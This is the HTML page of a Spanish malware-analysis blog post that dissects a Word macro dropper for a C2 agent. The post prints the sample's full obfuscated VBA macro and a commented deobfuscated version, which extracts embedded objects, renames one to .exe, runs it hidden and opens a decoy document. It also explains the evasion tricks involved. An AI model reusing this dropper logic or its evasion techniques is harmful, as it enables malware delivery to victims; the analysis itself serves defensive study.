@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    
+      <title>
+        003 - Analizando un agente de C2 - Parte 1: el Dropper
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="En esta primera parte, analizaremos una macro maliciosa que contiene un agente C2 embebido. Analizaremos cómo actúa, qué tecnicas utiliza para dificultar el análisis, y cómo podemos obtener indicadores de compromiso de esta."
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/es/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.css" />
+
+<link rel="stylesheet" href="/style.css" />
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png" />
+<link rel="shortcut icon" href="/img/favicon.png" />
+
+
+<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="003 - Analizando un agente de C2 - Parte 1: el Dropper"/>
+<meta name="twitter:description" content="En esta primera parte, analizaremos una macro maliciosa que contiene un agente C2 embebido. Analizaremos cómo actúa, qué tecnicas utiliza para dificultar el análisis, y cómo podemos obtener indicadores de compromiso de esta."/>
+
+
+
+<meta property="og:title" content="003 - Analizando un agente de C2 - Parte 1: el Dropper" />
+<meta property="og:description" content="En esta primera parte, analizaremos una macro maliciosa que contiene un agente C2 embebido. Analizaremos cómo actúa, qué tecnicas utiliza para dificultar el análisis, y cómo podemos obtener indicadores de compromiso de esta." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/es/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-08T22:29:12-05:00" />
+<meta property="article:modified_time" content="2023-12-08T22:29:12-05:00" /><meta property="og:site_name" content="The Malware Ninja Blog" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >The Malware Ninja</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/es/contact">Contacto</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/es/contact">Contacto</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+        <span>
+        <ul class="i18n">
+          
+            
+              
+              
+                
+                <li><a title="English" href="/en/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/"><img id="trans-flag" src=/img/flag-great-britain.png alt="English" /></a></li>
+              
+            
+          
+        </ul>
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <article class="post">
+    <h1 class="post-title">003 - Analizando un agente de C2 - Parte 1: el Dropper</h1>
+    <div class="post-meta">
+      
+        <time class="post-date">
+          2023-12-08
+        </time>
+
+        
+          
+        
+      
+
+      
+
+
+      
+        <span class="post-read-time"
+          >— 13 min de lectura</span
+        >
+      
+    </div>
+
+    
+
+    
+      <figure class="post-cover">
+  
+    <img src="/img/003-procExp.png" alt="003 - Analizando un agente de C2 - Parte 1: el Dropper"/>
+  
+
+  
+</figure>
+
+    
+
+    <div class="post-content">
+      
+      <p><em>This article is also available in <a href="/en/posts/003-analyzing-a-dotnet-c2-agent-part1-macro-dropper/">english</a></em></p>
+<h2 id="1-introducción">
+  1. Introducción
+  <a href="#1-introducci%c3%b3n" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>En esta ocasión decidí analizar un agente de comando y control (C2), revisando la forma en cómo llega a sus víctimas y qué técnicas utiliza para evadir defensas y dificultar el análisis. Dado que el post completo sería muy largo, lo he dividido en dos partes: la primera parte se centrará en el análisis de la macro que actúa como dropper, mientras que la segunda parte se centrará en el análisis del payload (agente de C2).</p>
+<p>El dropper elegido tiene como hash <strong>22ce9042f6f78202c6c346cef1b6e532</strong> y puede ser descargado del siguiente <a href="https://bazaar.abuse.ch/sample/e38c39e302de158d22e8d0ba9cd6cc9368817bc611418a5777d00b90a9341404/">enlace</a>.</p>
+<blockquote>
+<p><strong>Disclaimer</strong>: Ejecutar malware en un dispositivo personal/corporativo puede poner en riesgo tu información/la información de tu empresa. Nunca ejecutes malware en un dispositivo que no ha sido específicamente configurado para el análisis.</p>
+</blockquote>
+<h2 id="2-macros-de-office-la-técnica-que-no-parece-tener-fin">
+  2. Macros de Office: la técnica que no parece tener fin
+  <a href="#2-macros-de-office-la-t%c3%a9cnica-que-no-parece-tener-fin" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>Antes de iniciar con el análisis, quería ahondar un poco en qué son las macros y por qué son usualmente abusadas por atacantes.</p>
+<p>Las macros son secuencias de comandos que nos permiten automatizar tareas en programas de Microsoft Office; pueden ser utilizadas para formatear texto, ejecutar cálculos, etc. Las macros <a href="https://learn.microsoft.com/en-us/office/dev/scripts/resources/vba-differences#security">cuentan con los mismos privilegios que el programa donde se están ejecutando</a>, por lo que tienen acceso completo al equipo bajo el contexto del usuario que ejecutó el programa de Office.</p>
+<p>Las macros son de especial interés para los atacantes debido a las siguientes razones:</p>
+<ol>
+<li>Les permite incrustar código en documentos legítimos, por lo que no tienen que convencer al usuario de descargar un programa.</li>
+<li>La mayoría de usuarios está acostumbrado a utilizar programas de Office, y pueden recibir usualmente ese tipo de archivos por correo (especialmente en empresas).</li>
+<li>Puede que los sistemas de antispam de la empresa de su víctima bloquee los archivos con extensión .exe; sin embargo, probablemente permiten archivos de Office.</li>
+<li>La suite de Microsoft Office está ampliamente difundida, lo que aumenta la probabilidad de que el malware pueda ser ejecutado por su víctima.</li>
+<li>Pueden ser utilizadas tanto en Windows como en MacOS.</li>
+</ol>
+<p>El uso de Visual Basic para ejecutar comandos maliciosos es tan común que tiene una subtécnica de <a href="https://attack.mitre.org/techniques/T1059/005/">MITRE ATT&amp;CK asociada: T1059.005</a>, en la página de MITRE se puede encontrar mayor información sobre cómo ha sido utilizada esa técnica en otras campañas de distribución de malware.</p>
+<p>Microsoft <a href="https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked">ha empezado a bloquear</a> la ejecución de macros descargadas de internet en versiones recientes de Microsoft Office; sin embargo, aún muchas empresas y usuarios utilizan versiones desactualizadas, lo que permite que la técnica siga siendo ampliamente utilizada.</p>
+<h2 id="3-análisis-estático-del-archivo">
+  3. Análisis estático del archivo
+  <a href="#3-an%c3%a1lisis-est%c3%a1tico-del-archivo" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>Iniciamos el análisis obteniendo el hash del documento de Word malicioso:</p>
+<table>
+<thead>
+<tr>
+<th>Algoritmo</th>
+<th>Hash</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MD5</td>
+<td>22CE9042F6F78202C6C346CEF1B6E532</td>
+</tr>
+<tr>
+<td>SHA256</td>
+<td>E38C39E302DE158D22E8D0BA9CD6CC93 68817BC611418A5777D00B90A9341404</td>
+</tr>
+</tbody>
+</table>
+<p>Luego, iniciamos el análisis con <a href="https://github.com/decalage2/oletools/wiki/olevba"><em>olevba</em></a> utilizando el parámetro -a para ver el análisis que ofrece la herramienta:</p>
+<p><img src="/img/003-olevba-a.png" alt="alt text" title="OleVBA analysis"></p>
+<p>Vemos que <em>olevba</em> nos advierte que se ejecuta la función <strong>Document_Open</strong> automáticamente cuando se abre el archivo (comportamiento típico de macros maliciosas, que evitan requerir interacción del usuario); adicionalmente, vemos ciertas cadenas de texto que <em>olevba</em> considera sospechosas:</p>
+<table>
+<thead>
+<tr>
+<th>String</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Environ</td>
+<td>Se utiliza para leer variables de entorno</td>
+</tr>
+<tr>
+<td>Open</td>
+<td>Se utiliza para abrir archivos</td>
+</tr>
+<tr>
+<td>CopyFile</td>
+<td>Se utiliza para copiar archivos</td>
+</tr>
+<tr>
+<td>MkDir</td>
+<td>Se utiliza para crear directorios</td>
+</tr>
+<tr>
+<td>Shell</td>
+<td>Puede ser utilizada para ejecutar comandos en el sistema</td>
+</tr>
+</tbody>
+</table>
+<p>En este caso, <a href="/es/posts/002-analyzing-a-malicious-macro">a diferencia del artículo anterior</a>, <em>olevba</em> no detecta posibles indicadores de compromiso (IOC).</p>
+<p>Seguimos con el análisis utilizando el parámetro -c para visualizar las macros:</p>
+<p><img src="/img/003-olevba-c.png" alt="alt text" title="OleVBA macros"></p>
+<p>Al visualizar las macros, podemos evidenciar algunas técnicas que el atacante usó para dificultar el análisis y evadir defensas:</p>
+<ol>
+<li>No se utilizan nombres de funciones ni variables fáciles de entender, lo que dificulta el análisis manual.</li>
+<li>Se utiliza el método Replace para retirar, durante la ejecución de la macro, caracteres utilizados para engañar sistemas de identificación de patrones.</li>
+</ol>
+<p>La segunda técnica es de especial interés, ya que puede engañar a programas que busquen patrones para identificar cadenas potencialmente sospechosas (URLs, IPs, extensiones, nombres de archivos, etc). Por ejemplo, se puede utilizar la siguiente expresión regular para buscar cadenas de texto que terminen en .zip o .exe:</p>
+<pre tabindex="0"><code class="language-regex" data-lang="regex">\.(zip|exe)$
+</code></pre><p>En la macro, se visualiza la cadena &ldquo;do_mc_xs.zi_p&rdquo;, la cual no es detectada por la expresión regular; sin embargo, durante la ejecución se renombra a &ldquo;domcxs.zip&rdquo; para su posterior procesamiento.</p>
+<p>Dado que la función tiene varias filas, y es dificil de entender con nombres de variable poco amigables, la exportamos a un archivo para &ldquo;limpiarla&rdquo; un poco:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>olevba.exe -c .\e38c39e302de158d22e8d0ba9cd6cc9368817bc611418a5777d00b90a9341404.docm &gt; macros.vba
+</span></span></code></pre></div><p>Una vez exportada, identificamos que Document_Open() llama a la función &ldquo;weoqzisdi___lorfar()&rdquo;:</p>
+<p><img src="/img/003-documentOpen.png" alt="alt text" title="Document Open Function"></p>
+<p>Dado que no vemos que ninguna de las otras funciones contenga código, extraemos la función weoqzisdi___lorfar() para su análisis:</p>
+<pre tabindex="0"><code class="language-vba" data-lang="vba">Sub weoqzisdi___lorfar()
+    
+    Dim path_weoqzisdi___file As String
+    
+    Dim file_weoqzisdi___name  As String
+    
+    Dim folder_weoqzisdi___name  As Variant
+    Dim oAzedpp     As Object
+    
+    Set oAzedpp = CreateObject(&#34;Shell.Application&#34;)
+    
+    file_weoqzisdi___name = &#34;vteijam hdgtra&#34;
+    
+    folder_weoqzisdi___name = Environ$(&#34;USERPROFILE&#34;) &amp; &#34;\Wrdix&#34; &amp; &#34;&#34; &amp; Second(Now) &amp; &#34;\&#34;
+    
+    If Dir(folder_weoqzisdi___name, vbDirectory) = &#34;&#34; Then
+        MkDir (folder_weoqzisdi___name)
+    End If
+    
+    path_weoqzisdi___file = folder_weoqzisdi___name &amp; file_weoqzisdi___name
+    
+    Dim FSEDEO      As Object
+    Set FSEDEO = CreateObject(&#34;Scripting.FileSystemObject&#34;)
+    
+    FSEDEO.CopyFile Application.ActiveDocument.FullName, folder_weoqzisdi___name &amp; Replace(&#34;do_mc_xs&#34;, &#34;_&#34;, &#34;&#34;), TRUE
+    Set FSEDEO = Nothing
+    
+    Name folder_weoqzisdi___name &amp; Replace(&#34;do_mc_xs&#34;, &#34;_&#34;, &#34;&#34;) As folder_weoqzisdi___name &amp; Replace(&#34;do_mc_xs.zi_p&#34;, &#34;_&#34;, &#34;&#34;)
+    
+    oAzedpp.Namespace(folder_weoqzisdi___name).CopyHere oAzedpp.Namespace(folder_weoqzisdi___name &amp; Replace(&#34;do_mc_xs.zi_p&#34;, &#34;_&#34;, &#34;&#34;)).items
+    
+    Dim poueeds     As Integer
+    Dim filewedum   As String
+    
+    poueeds = InStr(Application.System.Version, &#34;.1&#34;)
+    
+    filewedum = 2
+    
+    If poueeds Then
+        filewedum = 1
+    End If
+    
+    Name folder_weoqzisdi___name &amp; &#34;word\embeddings\oleObject1.bin&#34; As folder_weoqzisdi___name &amp; &#34;word\&#34; &amp; file_weoqzisdi___name &amp; Replace(&#34;.z_ip&#34;, &#34;_&#34;, &#34;&#34;)
+    
+    oAzedpp.Namespace(folder_weoqzisdi___name).CopyHere oAzedpp.Namespace(folder_weoqzisdi___name &amp; &#34;word\&#34; &amp; file_weoqzisdi___name &amp; Replace(&#34;.z_ip&#34;, &#34;_&#34;, &#34;&#34;)).items
+    
+    Name folder_weoqzisdi___name &amp; &#34;oleObject&#34; &amp; filewedum &amp; &#34;.bin&#34; As folder_weoqzisdi___name &amp; file_weoqzisdi___name &amp; Replace(&#34;.e_xe&#34;, &#34;_&#34;, &#34;&#34;)
+    
+    Shell folder_weoqzisdi___name &amp; file_weoqzisdi___name &amp; Replace(&#34;.e_xe&#34;, &#34;_&#34;, &#34;&#34;), vbNormalNoFocus
+    
+    Dim dokc_paeth  As String
+    
+    dokc_paeth = Environ$(&#34;USERPROFILE&#34;) &amp; &#34;\Documents\&#34; &amp; Application.ActiveDocument.Name &amp; &#34;.docx&#34;
+    
+    If Dir(dokc_paeth) = &#34;&#34; Then
+        Name folder_weoqzisdi___name &amp; &#34;word\embeddings\oleObject3.bin&#34; As dokc_paeth
+    End If
+    
+    Documents.Open FileName:=dokc_paeth, ConfirmConversions:=False, _
+                   ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:=&#34;&#34;, _
+                   PasswordTemplate:=&#34;&#34;, Revert:=False, WritePasswordDocument:=&#34;&#34;, _
+                   WritePasswordTemplate:=&#34;&#34;, Format:=wdOpenFormatAuto, XMLTransform:=&#34;&#34;
+    
+End Sub
+</code></pre><p>Luego de eliminar las lineas extra, así como arreglar la identación, procedemos a renombrar las variables para hacerlas mas amigables:</p>
+<p><img src="/img/003-replace.png" alt="alt text" title="Replace names"></p>
+<p>En este caso, tenemos suerte de que algunas de las variables mantienen su nombre original antes de concatenarse con otros caracteres, por lo que nos permite identificar fácilmente para qué son utilizadas. De no tener esa información, podemos deducir su función en base a cómo están siendo utilizadas.</p>
+<p>Luego de cambiar el nombre a las variables largas, podemos empezar a avanzar fila por fila analizando lo que parece estar haciendo:</p>
+<pre tabindex="0"><code class="language-vba" data-lang="vba">Sub weoqzisdi___lorfar()
+    
+    Dim mpath       As String
+    Dim mfile       As String
+    Dim mfolder     As Variant
+    Dim mShellApplication As Object
+    
+    &#39;Crea objeto Shell.Application
+    Set mShellApplication = CreateObject(&#34;Shell.Application&#34;)
+    
+    &#39;Asigna la cadena de texto &#34;vteijam hdgtra&#34; a variable mfile
+    mfile = &#34;vteijam hdgtra&#34;
+    
+    &#39;Asigna la ruta de la variable de entorno &#34;USERPROFILE&#34; concatenada con
+    &#39;\Wrdix concatenada con el segundo en el que se ejecutó la función y concatenada con &#34;\&#34;
+    &#39;Por ejemplo: C:\Users\tmn\Wrdix12\
+    mfolder = Environ$(&#34;USERPROFILE&#34;) &amp; &#34;\Wrdix&#34; &amp; &#34;&#34; &amp; Second(Now) &amp; &#34;\&#34;
+    
+    &#39;Verifica si el directorio existe y sino, lo crea
+    If Dir(mfolder, vbDirectory) = &#34;&#34; Then
+        MkDir (mfolder)
+    End If
+    
+    &#39;Asigna a la variable mpath la ruta + nombre del archivo (C:\Users\tmn\Wrdix12\vteijam hdgtra)
+    mpath = mfolder &amp; mfile
+    
+    Dim FSEDEO      As Object
+    Set FSEDEO = CreateObject(&#34;Scripting.FileSystemObject&#34;)
+    
+    &#39;Se utiliza el método CopyFile, cuya sintaxis es object.CopyFile source, destination, [ overwrite ]
+    &#39;Se copia el archivo que se está ejecutando en la ruta almacenada en la variable mfolder, siendo renombrado a domcxs
+    &#39;Para ello, se utilizó la función &#34;Replace&#34; para quitar los subguiones a la cadena &#34;do_mc_xs&#34;
+    &#39;https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/copyfile-method
+    &#39;https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/replace-function
+    FSEDEO.CopyFile Application.ActiveDocument.FullName, mfolder &amp; Replace(&#34;do_mc_xs&#34;, &#34;_&#34;, &#34;&#34;), TRUE
+    Set FSEDEO = Nothing
+    
+    &#39;Utilizando la función &#34;Name&#34;, se cambia el nombre del archivo previamente copiado a domcxs.zip
+    &#39;La sintaxis es Name antiguoNombre As nuevoNombre
+    &#39;Se renombra mfolder\domcxs a mfolder\domcxs.zip
+    &#39;https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/name-statement
+    Name mfolder &amp; Replace(&#34;do_mc_xs&#34;, &#34;_&#34;, &#34;&#34;) As mfolder &amp; Replace(&#34;do_mc_xs.zi_p&#34;, &#34;_&#34;, &#34;&#34;)
+    
+    &#39;Extrae el archivo domcxs.zip a la ruta de mfolder
+    mShellApplication.Namespace(mfolder).CopyHere mShellApplication.Namespace(mfolder &amp; Replace(&#34;do_mc_xs.zi_p&#34;, &#34;_&#34;, &#34;&#34;)).items
+    
+    Dim poueeds     As Integer
+    Dim filewedum   As String
+    
+    &#39;Se valida si la versión de Word contiene &#34;.1&#34; y, dependiendo de eso, se asigna el valor a la variable filewedum
+    poueeds = InStr(Application.System.Version, &#34;.1&#34;)
+    filewedum = 2
+    If poueeds Then
+        filewedum = 1
+    End If
+    
+    &#39;Se renombra el archivo mfolder\word\embeddings\oleObject1.bin a &#34;mfoldder\word\vteijam hdgtra.zip&#34;
+    &#39;El contenido de la variable mfile (vteijam hdgtra) fue asignado al inicio de la función
+    Name mfolder &amp; &#34;word\embeddings\oleObject1.bin&#34; As mfolder &amp; &#34;word\&#34; &amp; mfile &amp; Replace(&#34;.z_ip&#34;, &#34;_&#34;, &#34;&#34;)
+    
+    &#39;Extrae el contenido de &#34;mfoldder\word\vteijam hdgtra.zip&#34; en la ruta de mfolder
+    mShellApplication.Namespace(mfolder).CopyHere mShellApplication.Namespace(mfolder &amp; &#34;word\&#34; &amp; mfile &amp; Replace(&#34;.z_ip&#34;, &#34;_&#34;, &#34;&#34;)).items
+    
+    &#39;Se renombra mfolder\oleObjectfilewedum.bin como mfolder\mfile.exe
+    Name mfolder &amp; &#34;oleObject&#34; &amp; filewedum &amp; &#34;.bin&#34; As mfolder &amp; mfile &amp; Replace(&#34;.e_xe&#34;, &#34;_&#34;, &#34;&#34;)
+    
+    &#39;Se ejecuta el comando mfolder\mfile.exe sin cambiar la vista al nuevo proceso
+    Shell mfolder &amp; mfile &amp; Replace(&#34;.e_xe&#34;, &#34;_&#34;, &#34;&#34;), vbNormalNoFocus
+    
+    &#39;Se guarda el archivo mfolder\word\embeddings\oleObject3.bin como C:\users\usuario\Documents\nombreDocumentoMalicioso.docx
+    Dim dokc_paeth  As String
+    
+    dokc_paeth = Environ$(&#34;USERPROFILE&#34;) &amp; &#34;\Documents\&#34; &amp; Application.ActiveDocument.Name &amp; &#34;.docx&#34;
+    
+    If Dir(dokc_paeth) = &#34;&#34; Then
+        Name mfolder &amp; &#34;word\embeddings\oleObject3.bin&#34; As dokc_paeth
+    End If
+    
+    &#39;Se abre el archivo .docx recientemente creado
+    
+    Documents.Open FileName
+    = dokc_paeth, ConfirmConversions
+    = False, _
+      ReadOnly
+    = False, AddToRecentFiles
+    = False, PasswordDocument
+    = &#34;&#34;, _
+      PasswordTemplate
+    = &#34;&#34;, Revert
+    = False, WritePasswordDocument
+    = &#34;&#34;, _
+      WritePasswordTemplate
+    = &#34;&#34;, Format
+    = wdOpenFormatAuto, XMLTransform
+    = &#34;&#34;
+    
+End Sub
+</code></pre><p>En base al análisis, parece que al abrirse el documento realiza las siguientes acciones:</p>
+<ol>
+<li>Se copia el documento malicioso a una ruta dentro del perfil del usuario</li>
+<li>Se cambia de nombre al documento y se le añade la extensión .zip</li>
+<li>Se extrae el .zip</li>
+<li>Se extrae un archivo .bin de los archivos previamente extraidos, se le cambia la extension a .zip</li>
+<li>Se extrae el contenido del .zip, el cual contiene otro archivo .bin</li>
+<li>Se cambia la extensión del nuevo archivo .bin a .exe</li>
+<li>Se ejecuta el .exe en segundo plano</li>
+<li>Se extrae otro archivo del documento original (archivos obtenidos en el paso 3) y se copia en la carpeta &ldquo;Documentos&rdquo; del usuario con extensión .docx</li>
+<li>Se abre el archivo .docx</li>
+</ol>
+<p>Como parte del análisis vemos otra manera que utilizan los atacantes para evadir defensas: el binario malicioso (.exe) estuvo almacenado dentro de 2 archivos comprimidos, cada uno con extensión .bin. Si un antivirus buscara la firma del .exe no lo encontraría debido a que está comprimido; de igual manera, si se basase en el tipo de extensión para determinar el tipo de archivo, puede que no detecte los .bin como archivos comprimidos.</p>
+<p>Ahora que ya tenemos una idea de qué está haciendo el documento malicioso, procedemos a ejecutarlo de manera controlada para verificar si el análisis fue el correcto.</p>
+<h2 id="4-análisis-dinámico-del-archivo">
+  4. Análisis dinámico del archivo
+  <a href="#4-an%c3%a1lisis-din%c3%a1mico-del-archivo" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>Antes de iniciar el análisis dinámico procedemos a abrir <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite"><em>Procmon</em> y <em>Process Explorer</em></a>, ya que sabemos que la macro interactúa con carpetas e inicia nuevos procesos.</p>
+<p>Al intentar abrir el editor de Visual Basic (antes de hacer click en &ldquo;Habilitar contenido&rdquo;), nos percatamos que tiene contraseña:</p>
+<p><img src="/img/003-password.png" alt="alt text" title="Password Protected Macro"></p>
+<p>Si bien el editor de Visual Basic no nos deja acceder al contenido sin tener la contraseña, ya pudimos visualizar las macros previamente por medio de <em>olevba</em>, lo que nos dice que Microsoft Office no almacena las macros cifradas en reposo, por lo que ponerles contraseña no es un control efectivo si lo que se busca es que no sean analizadas.</p>
+<p>En este caso tenemos dos opciones:</p>
+<ol>
+<li>Ejecutar el código VBA desde un archivo diferente (ya que lo obtuvimos previamente con <em>olevba</em>)</li>
+<li>Evadir la restricción en el archivo original</li>
+</ol>
+<p>En esta ocasión opté por la segunda opción (el cómo escapa del alcance del presente artículo, pero una rápida búsqueda en internet debe bastar).</p>
+<p>Una vez se tiene la macro abierta, podemos usar la tecla F8 para avanzar instrucción por instrucción. Podemos usar la ventana &ldquo;Locales&rdquo; para ver la asignación de contenido en las variables conforme se van ejecutando las instrucciones:</p>
+<p><img src="/img/003-locals.png" alt="alt text" title="Use of locals"></p>
+<p>La primera operación de interés que esperamos es la creación de una carpeta llamada Wrdix+número en la ruta del usuario (en este caso C:\users\tmn)</p>
+<pre tabindex="0"><code class="language-vba" data-lang="vba">    mfolder = Environ$(&#34;USERPROFILE&#34;) &amp; &#34;\Wrdix&#34; &amp; &#34;&#34; &amp; Second(Now) &amp; &#34;\&#34;
+    
+    If Dir(mfolder, vbDirectory) = &#34;&#34; Then
+        MkDir (mfolder)
+    End If
+</code></pre><p>Podemos comprobar que efectivamente se creó el directorio tanto inspeccionado la carpeta como por medio de <em>Procmon</em>:</p>
+<p><img src="/img/003-folderCreated.png" alt="alt text" title="New folder"></p>
+<p><img src="/img/003-procmonfolder.png" alt="alt text" title="Folder creation in ProcMon"></p>
+<p>La siguiente operación que esperamos es que se copie el documento a la carpeta creada, que se le asigne el nombre domcxs.zip y que sea extraido:</p>
+<pre tabindex="0"><code class="language-vba" data-lang="vba">    FSEDEO.CopyFile Application.ActiveDocument.FullName, mfolder &amp; Replace(&#34;do_mc_xs&#34;, &#34;_&#34;, &#34;&#34;), True
+    Name mfolder &amp; Replace(&#34;do_mc_xs&#34;, &#34;_&#34;, &#34;&#34;) As mfolder &amp; Replace(&#34;do_mc_xs.zi_p&#34;, &#34;_&#34;, &#34;&#34;)
+    mShellApplication.Namespace(mfolder).CopyHere mShellApplication.Namespace(mfolder &amp; Replace(&#34;do_mc_xs.zi_p&#34;, &#34;_&#34;, &#34;&#34;)).items
+</code></pre><p><img src="/img/003-extractfolder.png" alt="alt text" title="Document copied and extracted"></p>
+<p>Luego, esperamos que se cambie el nombre del archivo word\embeddings\oleObject1.bin a &ldquo;vteijam hdgtra.zip&rdquo;, que se extraiga y se cambie el nombre del archivo extraido a &ldquo;vteijam hdgtra.exe&rdquo;</p>
+<pre tabindex="0"><code class="language-vba" data-lang="vba">    &#39;Se renombra el archivo mfolder\word\embeddings\oleObject1.bin a &#34;mfoldder\word\vteijam hdgtra.zip&#34;
+    Name mfolder &amp; &#34;word\embeddings\oleObject1.bin&#34; As mfolder &amp; &#34;word\&#34; &amp; mfile &amp; Replace(&#34;.z_ip&#34;, &#34;_&#34;, &#34;&#34;)
+
+    &#39;Extrae el contenido de &#34;mfoldder\word\vteijam hdgtra.zip&#34; en la ruta de mfolder
+    mShellApplication.Namespace(mfolder).CopyHere mShellApplication.Namespace(mfolder &amp; &#34;word\&#34; &amp; mfile &amp; Replace(&#34;.z_ip&#34;, &#34;_&#34;, &#34;&#34;)).items
+    
+    &#39;Se renombra mfolder\filewedum.bin como mfolder\mfile.exe
+    Name mfolder &amp; &#34;oleObject&#34; &amp; filewedum &amp; &#34;.bin&#34; As mfolder &amp; mfile &amp; Replace(&#34;.e_xe&#34;, &#34;_&#34;, &#34;&#34;)
+</code></pre><p><img src="/img/003-zip-exe.png" alt="alt text" title="New zip just arrived"></p>
+<p>Finalmente, se ejecuta el binario &ldquo;vteijam hdgtra.exe&rdquo;:</p>
+<p><img src="/img/003-execution.png" alt="alt text" title="Executing exe"></p>
+<p>Podemos validar la creación de un nuevo proceso en <em>Process Explorer</em> y <em>Procmon</em>:</p>
+<p><img src="/img/003-procExp.png" alt="alt text" title="ProcExp exe"></p>
+<p><img src="/img/003-procmonexe.png" alt="alt text" title="Procmon exe"></p>
+<p>Si bien ya se inició el programa embebido en el documento de Word, queda una tarea pendiente al atacante para no levantar sospechas:</p>
+<pre tabindex="0"><code class="language-vba" data-lang="vba">    &#39;Se guarda el archivo mfolder\word\embeddings\oleObject3.bin como C:\users\usuario\Documents\nombreDocumentoMalicioso.docx
+    Dim dokc_paeth As String
+    
+    dokc_paeth = Environ$(&#34;USERPROFILE&#34;) &amp; &#34;\Documents\&#34; &amp; Application.ActiveDocument.Name &amp; &#34;.docx&#34;
+    
+    If Dir(dokc_paeth) = &#34;&#34; Then
+        Name mfolder &amp; &#34;word\embeddings\oleObject3.bin&#34; As dokc_paeth
+    End If
+    
+    &#39;Se ejecuta el archivo recientemente creado
+    
+    Documents.Open FileName
+     = dokc_paeth, ConfirmConversions
+     = False, _
+    ReadOnly
+     = False, AddToRecentFiles
+     = False, PasswordDocument
+     = &#34;&#34;, _
+    PasswordTemplate
+     = &#34;&#34;, Revert
+     = False, WritePasswordDocument
+     = &#34;&#34;, _
+    WritePasswordTemplate
+     = &#34;&#34;, Format
+     = wdOpenFormatAuto, XMLTransform
+     = &#34;&#34;
+</code></pre><p><img src="/img/003-newword.png" alt="alt text" title="Creating decoy file"></p>
+<p><img src="/img/003-decoy.png" alt="alt text" title="Decoy file"></p>
+<p>Al crear y abrir el nuevo archivo, a la víctima se le muestra el documento de Word que espera.</p>
+<p>Finalmente, validamos en <em>Procmon</em> que la segunda etapa empezó a realizar acciones:</p>
+<p><img src="/img/003-agent.png" alt="alt text" title="C2 agent"></p>
+<p>El payload malicioso corresponde a un agente de C2, cuyo análisis exploraremos en la segunda parte del post.</p>
+<h2 id="5-conclusiones">
+  5. Conclusiones
+  <a href="#5-conclusiones" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>Como pudimos ver en el análisis, el explorar cómo funciona un dropper nos permite comprender las distintas técnicas que un atacante puede seguir para evitar que el malware que desarrollan sea identificado: sea ponerle contraseña a las macros, ofuscar (aunque levemente) los nombres de variables y funciones, o embeber los payloads maliciosos bajo múltiples capas y renombres, todo tiene como fin dificultar el análisis manual y la rápida identificación por parte de herramientas automatizadas que se basan en firmas y patrones conocidos.</p>
